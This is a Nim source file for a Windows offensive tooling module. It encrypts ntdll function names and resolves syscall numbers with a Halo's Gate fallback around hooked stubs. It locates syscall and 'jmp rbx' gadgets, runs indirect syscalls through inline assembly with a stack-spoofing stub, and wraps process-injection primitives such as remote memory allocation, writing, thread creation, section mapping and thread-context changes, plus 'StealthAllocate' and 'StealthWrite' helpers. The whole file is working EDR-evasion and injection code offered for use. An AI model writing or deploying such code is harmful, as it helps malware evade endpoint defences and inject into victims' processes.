
import winim
import resolver, stealth_macros, os, utils

const 
    ENC_NTDLL        = enc("C:\\Windows\\System32\\ntdll.dll")
    ENC_ALLOCATE     = enc("NtAllocateVirtualMemory")
    ENC_WRITE        = enc("NtWriteVirtualMemory")
    ENC_PROTECT      = enc("NtProtectVirtualMemory")
    ENC_OPENPROC     = enc("NtOpenProcess")
    ENC_FREE         = enc("NtFreeVirtualMemory")
    ENC_GETCTX       = enc("NtGetContextThread")
    ENC_SETCTX       = enc("NtSetContextThread")
    ENC_TERMINATE    = enc("NtTerminateProcess")
    ENC_SUSPEND      = enc("NtSuspendProcess")
    ENC_READ         = enc("NtReadVirtualMemory")
    ENC_CREATETHREAD = enc("NtCreateThreadEx")
    ENC_CREATESECTION= enc("NtCreateSection")
    ENC_CREATEPROC   = enc("NtCreateProcessEx")
    ENC_MAPVIEW      = enc("NtMapViewOfSection")
    ENC_OPENFILE     = enc("NtOpenFile")
    ENC_QUERYPROC    = enc("NtQueryInformationProcess")
    ENC_NTDLL_SHORT  = enc("ntdll.dll")

proc get_ssn_from_disk_internal*(api_hash: uint32): uint32 =
    # Read SSN directly from in-memory ntdll (no file I/O needed)
    # This avoids IAT/stack issues when running inside a manually mapped DLL
    let ntdll = get_module_base(hash_api("ntdll.dll"))
    if ntdll == nil: return 0
    
    let base = cast[uint](ntdll)
    let dos_hdr = cast[ptr IMAGE_DOS_HEADER](base)
    let nt_hdr  = cast[ptr IMAGE_NT_HEADERS64](base + dos_hdr.e_lfanew.uint)
    
    let exp_dir_va = nt_hdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    if exp_dir_va == 0: return 0
    
    let exp_dir   = cast[ptr IMAGE_EXPORT_DIRECTORY](base + exp_dir_va.uint)
    let names     = cast[ptr UncheckedArray[uint32]](base + exp_dir.AddressOfNames.uint)
    let functions = cast[ptr UncheckedArray[uint32]](base + exp_dir.AddressOfFunctions.uint)
    let ordinals  = cast[ptr UncheckedArray[uint16]](base + exp_dir.AddressOfNameOrdinals.uint)
    
    # Helper: safely read SSN from an in-memory function stub
    proc get_ssn_at(func_rva: uint32): uint32 =
        if func_rva == 0: return 0
        let p = cast[ptr UncheckedArray[byte]](base + func_rva.uint)
        # Standard stub: 4C 8B D1 (mov r10, rcx) B8 XX XX 00 00 (mov eax, SSN)
        if p[0] == 0x4C and p[1] == 0x8B and p[2] == 0xD1 and p[3] == 0xB8:
            return cast[ptr uint32](addr p[4])[]
        return 0
    
    for i in 0..<exp_dir.NumberOfNames.int:
        let name_ptr = cast[ptr UncheckedArray[byte]](base + names[i].uint)
        var h = 5381.uint32
        var j = 0
        while true:
            let b = name_ptr[j]
            if b == 0: break
            h = ((h shl 5) + h) + b.uint32
            j += 1
        
        if h == api_hash:
            let ord_idx = ordinals[i].int
            # 1. Check function directly
            let direct_ssn = get_ssn_at(functions[ord_idx])
            if direct_ssn != 0: return direct_ssn
            
            # 2. Halo's Gate: search neighbors for unhooked stub
            for delta in 1..32:
                if ord_idx - delta >= 0:
                    let s = get_ssn_at(functions[ord_idx - delta])
                    if s != 0: return s + cast[uint32](delta)
                
                if ord_idx + delta < exp_dir.NumberOfFunctions.int:
                    let s = get_ssn_at(functions[ord_idx + delta])
                    if s != 0: return s - cast[uint32](delta)
            break
    
    return 0

proc find_syscall_gadget_v2*(ntdll_base: pointer): pointer =
    if ntdll_base == nil: return nil
    let base = cast[uint](ntdll_base)
    let dos_header = cast[ptr IMAGE_DOS_HEADER](base)
    let nt_header = cast[ptr IMAGE_NT_HEADERS64](base + dos_header.e_lfanew.uint)
    let sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](cast[uint](addr nt_header.OptionalHeader) + nt_header.FileHeader.SizeOfOptionalHeader.uint)
    
    for i in 0..<nt_header.FileHeader.NumberOfSections.int:
        let section = sections[i]
        if (section.Characteristics and 0x20000000) != 0: # EXECUTE
            let p = cast[ptr UncheckedArray[byte]](base + cast[uint](section.VirtualAddress))
            for j in 0..<cast[int](section.Misc.VirtualSize) - 2:
                if p[j] == 0x0F and p[j+1] == 0x05 and p[j+2] == 0xC3: # syscall; ret
                    return cast[pointer](addr p[j])
    return nil

proc find_spoof_gadget*(module_names: seq[string] = @["kernel32.dll", "ntdll.dll", "kernelbase.dll"]): pointer =
    for module_name in module_names:
        let hMod = get_module_base(hash_api(module_name))
        if hMod == nil: continue
        let base = cast[uint](hMod)
        let dos_header = cast[ptr IMAGE_DOS_HEADER](base)
        let nt_header = cast[ptr IMAGE_NT_HEADERS64](base + dos_header.e_lfanew.uint)
        let sections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](cast[uint](addr nt_header.OptionalHeader) + nt_header.FileHeader.SizeOfOptionalHeader.uint)
        
        for i in 0..<nt_header.FileHeader.NumberOfSections.int:
            let section = sections[i]
            if (section.Characteristics and 0x20000000) != 0: # EXECUTE
                let p = cast[ptr UncheckedArray[byte]](base + cast[uint](section.VirtualAddress))
                for j in 0..<cast[int](section.Misc.VirtualSize) - 2:
                    # Prioritize 'jmp rbx' (FF E3) for reliability
                    if p[j] == 0xFF and p[j+1] == 0xE3: 
                        # log_debug("[Gadget] Found 'jmp rbx' in " & module_name & " at 0x" & cast[uint](addr p[j]).toHex())
                        return cast[pointer](addr p[j])
                    # Also check for 'jmp [rbx]' (FF 23) but we prefer the direct one
    return nil

{.emit: """
#include <windows.h>
unsigned long long do_indirect_syscall_impl(unsigned int ssn, void* gadget, unsigned long long* args) {
    if (!gadget || !args) return 0xC0000001;
    unsigned long long ret_val = 0;
    __asm__ volatile (
        ".intel_syntax noprefix\n"
        "push rbp\n"
        "mov rbp, rsp\n"
        "and rsp, -16\n"
        
        "push rsi\n"
        "push rdi\n"
        "push rbx\n"
        
        "mov rsi, %[args]\n"
        "mov rbx, %[gadget]\n"
        
        "mov rcx, [rsi + 0]\n"
        "mov rdx, [rsi + 8]\n"
        "mov r8,  [rsi + 16]\n"
        "mov r9,  [rsi + 24]\n"
        "mov r10, rcx\n"
        
        /* 
           Alignment: 
           Initial RSP was 16-aligned.
           Push RBP -> -8 (8-aligned)
           Push RSI, RDI, RBX -> -24 (8-aligned, total -32 since initial)
           Sub 0x68 -> -104 (8-aligned, total -136).
           Wait, let's recalculate carefully:
           Before prologue: 16k
           After push rbp: 16k-8
           After and rsp, -16: 16j
           After push rsi, rdi, rbx: 16j - 24
           Total subtracted: 24.
           To make it 16-aligned (16n), we need (16j - 24 - X) = 16n
           -24 - X = -32 => X = 8.
           So we need to subtract an additional 8 bytes for alignment.
           Shadow space = 0x20.
           Plus args 5-11 = 7 * 8 = 56 (0x38).
           Total required = 0x20 + 0x38 = 0x58.
           0x58 + 8 (align) = 0x60.
           Wait, if we sub 0x60: total subtracted from 16j is 24 + 96 = 120. Not 16-aligned.
           If we sub 0x68: total subtracted is 24 + 104 = 128. Aligned! (128 = 16 * 8)
        */
        "sub rsp, 0x68\n" 
        "mov rax, [rsi + 32]\n"
        "mov [rsp + 0x20], rax\n"
        "mov rax, [rsi + 40]\n"
        "mov [rsp + 0x28], rax\n"
        "mov rax, [rsi + 48]\n"
        "mov [rsp + 0x30], rax\n"
        "mov rax, [rsi + 56]\n"
        "mov [rsp + 0x38], rax\n"
        "mov rax, [rsi + 64]\n"
        "mov [rsp + 0x40], rax\n"
        "mov rax, [rsi + 72]\n"
        "mov [rsp + 0x48], rax\n"
        "mov rax, [rsi + 80]\n"
        "mov [rsp + 0x50], rax\n"
        
        "mov eax, %[ssn]\n"
        "call rbx\n"
        
        "add rsp, 0x68\n"
        "pop rbx\n"
        "pop rdi\n"
        "pop rsi\n"
        
        "mov rsp, rbp\n"
        "pop rbp\n"
        "mov %[ret], rax\n"
        ".att_syntax\n"
        : [ret] "=r"(ret_val)
        : [gadget] "r"(gadget), [args] "r"(args), [ssn] "r"(ssn)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );
    return ret_val;
}


__asm__ (
    ".intel_syntax noprefix\n"
    ".global spoofer_stub\n"
    "spoofer_stub:\n"
    "    push rbp\n"
    "    mov rbp, rsp\n"
    "    push rbx\n"
    "    push rsi\n"
    "    push rdi\n"
    "    \n"
    "    mov r10, rcx # target func\n"
    "    mov r11, rdx # gadget\n"
    "    \n"
    "    # Arg1..4 were passed in R8, R9, [rbp+48], [rbp+56]\n"
    "    # Shift them to RCX, RDX, R8, R9 for the target call\n"
    "    mov rcx, r8\n"
    "    mov rdx, r9\n"
    "    mov r8,  [rbp + 48]\n"
    "    mov r9,  [rbp + 56]\n"
    "    \n"
    "    # Stack Allocation & Alignment\n"
    "    # Entry RSP (before CALL) was 16-aligned. Let's call it RSP_ENTRY.\n"
    "    # After CALL (RET): RSP = RSP_ENTRY - 8\n"
    "    # After PUSH RBP, RBX, RSI, RDI: RSP = RSP_ENTRY - 8 - 8 - 8 - 8 - 8 = RSP_ENTRY - 40\n"
    "    # To be 16-aligned before NEXT CALL, RSP must be 16k.\n"
    "    # (RSP_ENTRY - 40) - 152 = RSP_ENTRY - 192. 192 is divisible by 16 (12 times). Aligned!\n"
    "    sub rsp, 152\n"
    "    \n"
    "    # Copy spoofer's stack args 5-11 to target's stack positions\n"
    "    # spoofer_stub args:\n"
    "    # func_ptr (rcx), gadget (rdx), arg1 (r8), arg2 (r9),\n"
    "    # arg3 ([rbp+48]), arg4 ([rbp+56]), arg5 ([rbp+64]), ..., arg11 ([rbp+112])\n"
    "    # Target call stack args (after shadow space):\n"
    "    # arg5 ([rsp+32]), arg6 ([rsp+40]), ..., arg11 ([rsp+80])\n"
    "    mov rax, [rbp + 64];  mov [rsp + 32], rax\n"
    "    mov rax, [rbp + 72];  mov [rsp + 40], rax\n"
    "    mov rax, [rbp + 80];  mov [rsp + 48], rax\n"
    "    mov rax, [rbp + 88];  mov [rsp + 56], rax\n"
    "    mov rax, [rbp + 96];  mov [rsp + 64], rax\n"
    "    mov rax, [rbp + 104]; mov [rsp + 72], rax\n"
    "    mov rax, [rbp + 112]; mov [rsp + 80], rax\n"
    "    \n"
    "    mov rbx, r10 # Gadget will 'jmp rbx'\n"
    "    call r11\n"
    "    \n"
    "    add rsp, 152\n"
    "    pop rdi\n"
    "    pop rsi\n"
    "    pop rbx\n"
    "    pop rbp\n"
    "    ret\n"
    ".att_syntax\n"
);
""".}

proc do_indirect_syscall_impl(ssn: uint32, gadget: pointer, args: ptr uint64): uint64 {.importc: "do_indirect_syscall_impl", nodecl.}
proc spoofer_stub*(
    func_ptr: pointer,
    gadget: pointer,
    arg1: pointer,
    arg2: pointer,
    arg3: pointer,
    arg4: pointer,
    arg5: pointer,
    arg6: pointer,
    arg7: pointer,
    arg8: pointer,
    arg9: pointer,
    arg10: pointer,
    arg11: pointer
): uint64 {.importc: "spoofer_stub", cdecl, nodecl.}

proc NtCreateSection*(section_handle: PHANDLE, access_mask: ACCESS_MASK, obj_attributes: POBJECT_ATTRIBUTES, max_size: PLARGE_INTEGER, section_protect: ULONG, alloc_attributes: ULONG, file_handle: HANDLE): NTSTATUS =
    let ntdll = get_module_base(hash_api("ntdll.dll"))
    let ssn = get_ssn_from_disk_internal(dec(ENC_CREATESECTION).hash_api)
    let gadget = find_syscall_gadget_v2(ntdll)
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](section_handle); args[1] = cast[uint64](access_mask); args[2] = cast[uint64](obj_attributes)
    args[3] = cast[uint64](max_size); args[4] = cast[uint64](section_protect); args[5] = cast[uint64](alloc_attributes); args[6] = cast[uint64](file_handle)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtCreateProcessEx*(process_handle: PHANDLE, access_mask: ACCESS_MASK, obj_attributes: POBJECT_ATTRIBUTES, parent_process: HANDLE, flags: ULONG, section_handle: HANDLE, debug_port: HANDLE, exception_port: HANDLE, in_job: ULONG): NTSTATUS =
    let ntdll = get_module_base(hash_api("ntdll.dll"))
    let ssn = get_ssn_from_disk_internal(dec(ENC_CREATEPROC).hash_api)
    let gadget = find_syscall_gadget_v2(ntdll)
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](process_handle); args[1] = cast[uint64](access_mask); args[2] = cast[uint64](obj_attributes)
    args[3] = cast[uint64](parent_process); args[4] = cast[uint64](flags); args[5] = cast[uint64](section_handle); args[6] = cast[uint64](debug_port)
    args[7] = cast[uint64](exception_port); args[8] = cast[uint64](in_job)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtOpenProcess*(process_handle: PHANDLE, access_mask: ACCESS_MASK, obj_attributes: POBJECT_ATTRIBUTES, client_id: PCLIENT_ID): NTSTATUS =
    try:
        # log_debug("[NtOpenProcess] Start")
        let ntdll = get_module_base(hash_api("ntdll.dll"))
        # log_debug("[NtOpenProcess] ntdll base: 0x" & cast[uint](ntdll).toHex())
        
        # log_debug("[NtOpenProcess] decrypting enc...")
        let dec_str = dec(ENC_OPENPROC)
        # log_debug("[NtOpenProcess] hashing api " & dec_str)
        let hash_val = hash_api(dec_str)
        # log_debug("[NtOpenProcess] hash is " & $hash_val)
        
        # log_debug("[NtOpenProcess] Getting SSN...")
        let ssn = get_ssn_from_disk_internal(hash_val)
        # log_debug("[NtOpenProcess] SSN: " & $ssn)
        
        # log_debug("[NtOpenProcess] Getting Gadget...")
        let gadget = find_syscall_gadget_v2(ntdll)
        # log_debug("[NtOpenProcess] Gadget: 0x" & cast[uint](gadget).toHex())
        
        if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
        var args: array[11, uint64]
        args[0] = cast[uint64](process_handle); args[1] = cast[uint64](access_mask)
        args[2] = cast[uint64](obj_attributes); args[3] = cast[uint64](client_id)
        
        # log_debug("[NtOpenProcess] Calling syscall...")
        let ret = cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))
        # log_debug("[NtOpenProcess] Ret: 0x" & cast[uint32](ret).toHex())
        return ret
    except:
        # log_debug("[NtOpenProcess] EXCEPTION CAUGHT")
        return cast[NTSTATUS](0xC0000001)

var g_ntdll*: pointer = nil
var g_gadget*: pointer = nil

# SSN cache — hash_api(name) → SSN
var g_ssn_cache: array[64, tuple[h: uint32, ssn: uint32]]
var g_ssn_count: int = 0

proc cached_ssn*(api_hash: uint32): uint32 =
    for i in 0..<g_ssn_count:
        if g_ssn_cache[i].h == api_hash:
            return g_ssn_cache[i].ssn
    let ssn = get_ssn_from_disk_internal(api_hash)
    if g_ssn_count < 64:
        g_ssn_cache[g_ssn_count] = (api_hash, ssn)
        g_ssn_count += 1
    return ssn

proc init_syscalls*() =
    if g_ntdll == nil:
        g_ntdll = get_module_base(hash_api(dec(ENC_NTDLL_SHORT)))
    if g_gadget == nil and g_ntdll != nil:
        g_gadget = find_syscall_gadget_v2(g_ntdll)

# Global initialization at load
init_syscalls()

proc NtAllocateVirtualMemory*(
    ProcessHandle: HANDLE, 
    BaseAddress: ptr pointer, 
    ZeroBits: ULONG_PTR, 
    RegionSize: ptr SIZE_T, 
    AllocationType: ULONG, 
    Protect: ULONG): NTSTATUS =
    
    let ssn = cached_ssn(dec(ENC_ALLOCATE).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](ProcessHandle); args[1] = cast[uint64](BaseAddress); args[2] = cast[uint64](ZeroBits)
    args[3] = cast[uint64](RegionSize); args[4] = cast[uint64](AllocationType); args[5] = cast[uint64](Protect)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtWriteVirtualMemory*(process: HANDLE, base: pointer, buffer: pointer, size: SIZE_T, bytes_written: PSIZE_T): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_WRITE).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](process); args[1] = cast[uint64](base); args[2] = cast[uint64](buffer)
    args[3] = cast[uint64](size); args[4] = cast[uint64](bytes_written)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtReadVirtualMemory*(process: HANDLE, base: pointer, buffer: pointer, size: SIZE_T, bytes_read: PSIZE_T): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_READ).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](process); args[1] = cast[uint64](base); args[2] = cast[uint64](buffer)
    args[3] = cast[uint64](size); args[4] = cast[uint64](bytes_read)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtProtectVirtualMemory*(process: HANDLE, base: ptr pointer, size: PSIZE_T, protect: ULONG, old_protect: PULONG): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_PROTECT).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](process); args[1] = cast[uint64](base); args[2] = cast[uint64](size)
    args[3] = cast[uint64](protect); args[4] = cast[uint64](old_protect)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtFreeVirtualMemory*(process: HANDLE, base: ptr pointer, size: PSIZE_T, free_type: ULONG): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_FREE).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](process); args[1] = cast[uint64](base)
    args[2] = cast[uint64](size); args[3] = cast[uint64](free_type)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtGetContextThread*(thread_handle: HANDLE, context: PCONTEXT): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_GETCTX).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](thread_handle); args[1] = cast[uint64](context)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtSetContextThread*(thread_handle: HANDLE, context: PCONTEXT): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_SETCTX).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](thread_handle); args[1] = cast[uint64](context)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtTerminateProcess*(process_handle: HANDLE, exit_status: NTSTATUS): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_TERMINATE).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](process_handle); args[1] = cast[uint64](exit_status)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtSuspendProcess*(process_handle: HANDLE): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_SUSPEND).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](process_handle)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtCreateThreadEx*(thread_handle: PHANDLE, desired_access: ACCESS_MASK, object_attributes: POBJECT_ATTRIBUTES, process_handle: HANDLE, start_routine: pointer, argument: pointer, create_flags: ULONG, zero_bits: SIZE_T, stack_size: SIZE_T, max_stack_size: SIZE_T, attribute_list: pointer): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_CREATETHREAD).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](thread_handle); args[1] = cast[uint64](desired_access); args[2] = cast[uint64](object_attributes)
    args[3] = cast[uint64](process_handle); args[4] = cast[uint64](start_routine); args[5] = cast[uint64](argument)
    args[6] = cast[uint64](create_flags); args[7] = cast[uint64](zero_bits); args[8] = cast[uint64](stack_size)
    args[9] = cast[uint64](max_stack_size); args[10] = cast[uint64](attribute_list)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtMapViewOfSection*(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: ptr pointer, ZeroBits: ULONG_PTR, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_MAPVIEW).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](SectionHandle); args[1] = cast[uint64](ProcessHandle); args[2] = cast[uint64](BaseAddress)
    args[3] = cast[uint64](ZeroBits); args[4] = cast[uint64](CommitSize); args[5] = cast[uint64](SectionOffset)
    args[6] = cast[uint64](ViewSize); args[7] = cast[uint64](InheritDisposition); args[8] = cast[uint64](AllocationType)
    args[9] = cast[uint64](Win32Protect)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtOpenFile*(FileHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, IoStatusBlock: PIO_STATUS_BLOCK, ShareAccess: ULONG, OpenOptions: ULONG): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_OPENFILE).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](FileHandle); args[1] = cast[uint64](DesiredAccess); args[2] = cast[uint64](ObjectAttributes)
    args[3] = cast[uint64](IoStatusBlock); args[4] = cast[uint64](ShareAccess); args[5] = cast[uint64](OpenOptions)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc NtQueryInformationProcess*(process_handle: HANDLE, info_class: ULONG, info: pointer, info_len: ULONG, ret_len: PULONG): NTSTATUS =
    let ssn = cached_ssn(dec(ENC_QUERYPROC).hash_api)
    let gadget = g_gadget
    if gadget == nil or ssn == 0: return cast[NTSTATUS](0xC0000001)
    var args: array[11, uint64]
    args[0] = cast[uint64](process_handle); args[1] = cast[uint64](info_class)
    args[2] = cast[uint64](info); args[3] = cast[uint64](info_len); args[4] = cast[uint64](ret_len)
    return cast[NTSTATUS](do_indirect_syscall_impl(ssn, gadget, addr args[0]))

proc StealthAllocate*(hProcess: HANDLE, size: int, protect: uint32): pointer =
    var remote_base: pointer = nil
    var remote_size: SIZE_T = size.SIZE_T
    let status = NtAllocateVirtualMemory(hProcess, addr remote_base, 0, addr remote_size, MEM_COMMIT or MEM_RESERVE, cast[ULONG](protect))
    if status == 0: return remote_base
    return nil

proc StealthWrite*(hProcess: HANDLE, base: pointer, buffer: pointer, size: int): bool =
    var bytes_written: SIZE_T
    let status = NtWriteVirtualMemory(hProcess, base, buffer, size.SIZE_T, addr bytes_written)
    return status == 0
